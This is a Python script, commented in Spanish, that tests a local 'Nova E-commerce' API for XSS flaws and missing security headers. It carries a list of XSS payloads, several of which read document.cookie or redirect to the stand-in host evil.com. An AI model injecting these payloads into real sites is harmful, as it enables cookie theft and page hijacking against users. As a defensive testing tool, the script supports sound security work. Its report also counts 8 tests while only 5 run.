#!/usr/bin/env python3
"""
Script de prueba de XSS (Cross-Site Scripting) para Nova E-commerce

Autor: Security Testing Suite
Fecha: 2026-04-13

Este script prueba diversos payloads XSS en el sistema para identificar vulnerabilidades.
"""

import requests
import json
import sys
from typing import List, Tuple, Dict

# Configuración
BASE_URL = "http://localhost:8000"
API_URL = f"{BASE_URL}/api"

# Colores para salida
GREEN = "\033[92m"
RED = "\033[91m"
YELLOW = "\033[93m"
BLUE = "\033[94m"
RESET = "\033[0m"


# ============================================================================
# PAYLOADS XSS DE PRUEBA
# ============================================================================

XSS_PAYLOADS = {
    'basic': [
        # Script básico
        "<script>alert('XSS')</script>",
        "<script>alert(String.fromCharCode(88,83,83))</script>",
        "<script>alert(document.cookie)</script>",
        "<script>document.location='http://evil.com'</script>",

        # Image onerror
        "<img src=x onerror=alert('XSS')>",
        "<img src=x onerror=alert(document.cookie)>",
        "<img src=x onerror=document.location='http://evil.com'>",

        # SVG con onerror
        "<svg onload=alert('XSS')>",
        "<svg onload=alert(document.cookie)>",
        "<svg><script>alert('XSS')</script></svg>",
    ],

    'advanced': [
        # Event handlers
        "<div onmouseover=alert('XSS')>Hover me</div>",
        "<div onmouseover=alert(document.cookie)>Hover</div>",
        "<body onload=alert('XSS')>",
        "<input onfocus=alert('XSS') autofocus>",
        "<select onfocus=alert('XSS') autofocus><option>",
        "<textarea onfocus=alert('XSS') autofocus>",

        # JavaScript URI
        "<a href='javascript:alert(\"XSS\")'>Click</a>",
        "<a href='javascript:alert(document.cookie)'>Click</a>",
        "<iframe src='javascript:alert(XSS)'></iframe>",

        # CSS expression
        "<div style='background:url(javascript:alert(XSS))'>",
        "<div style='expression(alert(XSS))'>",

        # With comments
        "<script><!-- alert('XSS'); //--></script>",
        "<script>/*<*/alert('XSS')/*>*/</script>",

        # Case insensitive
        "<ScRiPt>alert('XSS')</sCrIpT>",
        "<IMG SRC=x OnErRoR=alert('XSS')>",
        "<SVG OnLoAd=alert('XSS')>",
    ],

    'encoded': [
        # Unicode bypass
        "\\u003Cscript\\u003Ealert('XSS')\\u003C/script\\u003E",
        "\\u003Cimg src=x onerror=alert('XSS')\\u003E",

        # Hex encoding
        "%3Cscript%3Ealert('XSS')%3C/script%3E",
        "%3Cimg%20src%3Dx%20onerror%3Dalert('XSS')%3E",

        # URL encoding
        "<script>alert(String.fromCharCode(88,83,83))</script>",
    ],

    'polyglot': [
        # XSS polyglots (funcionan en múltiples contextos)
        "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=alert()//'>",
        "<script>/**/alert(document['cookie'])/**/</script>",
        "<svg onload=alert(document.cookie)>",
        "'-alert(1)-'",
        "'-alert(1)-'",
    ],

    'dom_based': [
        # DOM-based XSS payloads
        "#<script>alert('XSS')</script>",
        "?search=<script>alert('XSS')</script>",
        "javascript:alert('XSS')",
        "data:text/html,<script>alert('XSS')</script>",
    ]
}


class XSSTester:
    """Clase para probar vulnerabilidades XSS"""

    def __init__(self, base_url: str):
        self.base_url = base_url
        self.api_url = f"{base_url}/api"
        self.results = []

    def print_result(self, test_name: str, status: str, details: str = ""):
        """Imprime resultado formateado"""
        if status == "VULNERABLE":
            print(f"{RED}⚠️  VULNERABLE: {test_name}{RESET}")
            if details:
                print(f"   {YELLOW}Detalles: {details}{RESET}")
        elif status == "SAFE":
            print(f"{GREEN}✅ SAFE: {test_name}{RESET}")
        elif status == "ERROR":
            print(f"{RED}❌ ERROR: {test_name}{RESET}")
            if details:
                print(f"   {details}")
        else:
            print(f"{BLUE}ℹ️  INFO: {test_name}{RESET}")

    # ========================================================================
    # PRUEBAS DE STORED XSS
    # ========================================================================

    def test_stored_xss_productos(self):
        """Prueba Stored XSS en endpoint de productos"""
        self.print_result("Iniciando pruebas de Stored XSS en productos", "INFO")

        # Payloads a probar
        payloads_to_test = XSS_PAYLOADS['basic'][:3]  # Probar 3 payloads básicos

        for payload in payloads_to_test:
            try:
                response = requests.post(
                    f"{self.api_url}/productos-tienda/",
                    json={
                        "nombre": payload,
                        "descripcion": payload,
                        "precio": 100.00,
                        "sucursal_id": 1
                    },
                    headers={"Content-Type": "application/json"},
                    timeout=10
                )

                if response.status_code in [200, 201]:
                    producto = response.json()

                    # Verificar si el payload se guardó sin sanitizar
                    if payload in str(producto.get('nombre', '')) or \
                       payload in str(producto.get('descripcion', '')):

                        self.print_result(
                            f"Stored XSS en productos: {payload[:40]}...",
                            "VULNERABLE",
                            "El payload se guardó sin sanitizar"
                        )
                        self.results.append(("Stored XSS - Productos", payload, True))
                    else:
                        self.print_result(
                            f"Stored XSS en productos: {payload[:40]}...",
                            "SAFE",
                            "El payload fue sanitizado correctamente"
                        )
                else:
                    self.print_result(
                        f"Stored XSS en productos: {payload[:40]}...",
                        "ERROR",
                        f"Status code: {response.status_code}"
                    )

            except Exception as e:
                self.print_result(
                    f"Stored XSS en productos: {payload[:40]}...",
                    "ERROR",
                    str(e)
                )

    def test_stored_xss_categorias(self):
        """Prueba Stored XSS en categorías"""
        self.print_result("Iniciando pruebas de Stored XSS en categorías", "INFO")

        payload = "<script>alert('XSS')</script>"

        try:
            response = requests.post(
                f"{self.api_url}/categorias-tienda/",
                json={
                    "nombre": payload,
                    "descripcion": payload
                },
                headers={"Content-Type": "application/json"},
                timeout=10
            )

            if response.status_code in [200, 201]:
                categoria = response.json()

                if payload in str(categoria.get('nombre', '')):
                    self.print_result(
                        "Stored XSS en categorías",
                        "VULNERABLE",
                        "El payload se guardó sin sanitizar"
                    )
                    self.results.append(("Stored XSS - Categorías", payload, True))
                else:
                    self.print_result(
                        "Stored XSS en categorías",
                        "SAFE"
                    )
            else:
                self.print_result(
                    "Stored XSS en categorías",
                    "ERROR",
                    f"Status code: {response.status_code}"
                )

        except Exception as e:
            self.print_result(
                "Stored XSS en categorías",
                "ERROR",
                str(e)
            )

    # ========================================================================
    # PRUEBAS DE REFLECTED XSS
    # ========================================================================

    def test_reflected_xss_search(self):
        """Prueba Reflected XSS en endpoints de búsqueda"""
        self.print_result("Iniciando pruebas de Reflected XSS en búsqueda", "INFO")

        payloads_to_test = XSS_PAYLOADS['basic'][:3]

        for payload in payloads_to_test:
            try:
                response = requests.get(
                    f"{self.api_url}/productos/list/",
                    params={"search": payload},
                    timeout=10
                )

                # Verificar si el payload se refleja sin escapar
                if payload in response.text:
                    self.print_result(
                        f"Reflected XSS en búsqueda: {payload[:40]}...",
                        "VULNERABLE",
                        "El payload se reflejó sin escapar"
                    )
                    self.results.append(("Reflected XSS - Búsqueda", payload, True))
                else:
                    self.print_result(
                        f"Reflected XSS en búsqueda: {payload[:40]}...",
                        "SAFE"
                    )

            except Exception as e:
                self.print_result(
                    f"Reflected XSS en búsqueda: {payload[:40]}...",
                    "ERROR",
                    str(e)
                )

    # ========================================================================
    # PRUEBAS DE HEADERS DE SEGURIDAD
    # ========================================================================

    def test_security_headers(self):
        """Verifica headers de seguridad XSS"""
        self.print_result("Verificando headers de seguridad XSS", "INFO")

        try:
            response = requests.get(f"{self.api_url}/", timeout=10)

            headers_to_check = {
                'X-XSS-Protection': 'Protección XSS',
                'Content-Security-Policy': 'Content Security Policy',
                'X-Content-Type-Options': 'Nosniff',
                'X-Frame-Options': 'Frame Protection',
                'Strict-Transport-Security': 'HSTS',
            }

            missing_headers = []

            for header, description in headers_to_check.items():
                if header in response.headers:
                    self.print_result(
                        f"✅ {description}: Presente",
                        "SAFE",
                        f"{header}: {response.headers[header][:50]}..."
                    )
                else:
                    self.print_result(
                        f"❌ {description}: FALTANTE",
                        "VULNERABLE",
                        f"Header {header} no está presente"
                    )
                    missing_headers.append(header)

            if missing_headers:
                self.results.append((
                    "Security Headers",
                    f"Headers faltantes: {', '.join(missing_headers)}",
                    True
                ))

        except Exception as e:
            self.print_result(
                "Verificación de headers",
                "ERROR",
                str(e)
            )

    # ========================================================================
    # PRUEBAS DE CSP
    # ========================================================================

    def test_csp_policy(self):
        """Analiza la política de Content Security Policy"""
        self.print_result("Analizando Content Security Policy", "INFO")

        try:
            response = requests.get(f"{self.api_url}/", timeout=10)
            csp_header = response.headers.get('Content-Security-Policy', '')

            if not csp_header:
                self.print_result(
                    "CSP Policy",
                    "VULNERABLE",
                    "No hay header Content-Security-Policy"
                )
                self.results.append(("CSP", "No implementado", True))
                return

            # Analizar directivas CSP
            directives = {
                'default-src': 'Aceptable',
                'script-src': 'Scripts permitidos',
                'object-src': 'Objects permitidos',
                'frame-src': 'Frames permitidos',
            }

            vulnerabilities_found = []

            for directive, description in directives.items():
                if directive in csp_header:
                    if "'unsafe-inline'" in csp_header and directive == 'script-src':
                        vulnerabilities_found.append(f"{directive} permite 'unsafe-inline'")
                        self.print_result(
                            f"CSP {directive}",
                            "VULNERABLE",
                            "Permite 'unsafe-inline' - XSS más fácil"
                        )
                else:
                    if directive != 'default-src':  # default-src es opcional
                        vulnerabilities_found.append(f"Falta {directive}")

            if vulnerabilities_found:
                self.print_result(
                    "CSP Policy",
                    "VULNERABLE",
                    f"Problemas: {', '.join(vulnerabilities_found)}"
                )
                self.results.append(("CSP", vulnerabilities_found, True))
            else:
                self.print_result(
                    "CSP Policy",
                    "SAFE",
                    "Configuración adecuada"
                )

        except Exception as e:
            self.print_result(
                "CSP Policy",
                "ERROR",
                str(e)
            )

    # ========================================================================
    # REPORTE FINAL
    # ========================================================================

    def generate_report(self):
        """Genera reporte final de todas las pruebas"""
        print("\n" + "="*80)
        print(f"{BLUE}REPORTE FINAL DE PRUEBAS XSS{RESET}")
        print("="*80 + "\n")

        # Estadísticas
        total_tests = 8
        vulnerable_tests = len(self.results)

        print(f"Total de pruebas realizadas: {total_tests}")
        print(f"Vulnerabilidades encontradas: {RED}{vulnerable_tests}{RESET}")
        print(f"Pruebas seguras: {GREEN}{total_tests - vulnerable_tests}{RESET}\n")

        if self.results:
            print(f"{RED}⚠️  VULNERABILIDADES DETECTADAS:{RESET}\n")
            for test_type, details, is_vuln in self.results:
                print(f"  • {test_type}: {str(details)[:60]}...")
        else:
            print(f"{GREEN}✅ NO SE DETECTARON VULNERABILIDADES XSS SIGNIFICATIVAS{RESET}")
            print(f"{GREEN}   El sistema parece estar protegido contra XSS.{RESET}")

        # Recomendaciones
        print("\n" + "="*80)
        print(f"{BLUE}RECOMENDACIONES{RESET}")
        print("="*80 + "\n")

        recommendations = [
            "1. Implementar sanitización de input con Bleach o DOMPurify",
            "2. Configurar Content Security Policy estricta",
            "3. Usar HttpOnly cookies para prevenir robo de sesiones",
            "4. Implementar rate limiting en endpoints de creación",
            "5. Escapar siempre el contenido dinámico en el frontend",
            "6. Validar y sanitizar tanto en backend como en frontend",
            "7. Mantener React y dependencias actualizadas",
            "8. Realizar auditorías de seguridad periódicas",
        ]

        for rec in recommendations:
            print(f"  {rec}")

        print("\n" + "="*80)

    # ========================================================================
    # EJECUCIÓN DE TODAS LAS PRUEBAS
    # ========================================================================

    def run_all_tests(self):
        """Ejecuta todas las pruebas de XSS"""
        print(f"\n{BLUE}{'='*80}{RESET}")
        print(f"{BLUE}INICIANDO PRUEBAS DE XSS - NOVA E-COMMERCE{RESET}")
        print(f"{BLUE}{'='*80}{RESET}\n")

        # Verificar que el servidor esté accesible
        try:
            response = requests.get(f"{self.api_url}/", timeout=5)
            if response.status_code >= 500:
                print(f"{RED}Error: El servidor respondió con error {response.status_code}{RESET}")
                return
        except Exception as e:
            print(f"{RED}Error: No se puede conectar al servidor{RESET}")
            print(f"Verifica que el servidor esté corriendo en {self.base_url}")
            print(f"Error: {e}")
            return

        # Ejecutar todas las pruebas
        print(f"{BLUE}[1/8] Stored XSS - Productos{RESET}")
        self.test_stored_xss_productos()

        print(f"\n{BLUE}[2/8] Stored XSS - Categorías{RESET}")
        self.test_stored_xss_categorias()

        print(f"\n{BLUE}[3/8] Reflected XSS - Búsqueda{RESET}")
        self.test_reflected_xss_search()

        print(f"\n{BLUE}[4/8] Security Headers{RESET}")
        self.test_security_headers()

        print(f"\n{BLUE}[5/8] CSP Policy{RESET}")
        self.test_csp_policy()

        # Generar reporte
        self.generate_report()


# ============================================================================
# MAIN
# ============================================================================

if __name__ == "__main__":
    print(f"""
{BLUE}
╔═══════════════════════════════════════════════════════════════════╗
║                     XSS TESTING SUITE                             ║
║                  Para Nova E-commerce                             ║
╚═══════════════════════════════════════════════════════════════════╝
{RESET}
    """)

    # Verificar argumentos de línea de comandos
    base_url = sys.argv[1] if len(sys.argv) > 1 else BASE_URL

    # Crear tester y ejecutar pruebas
    tester = XSSTester(base_url)
    tester.run_all_tests()
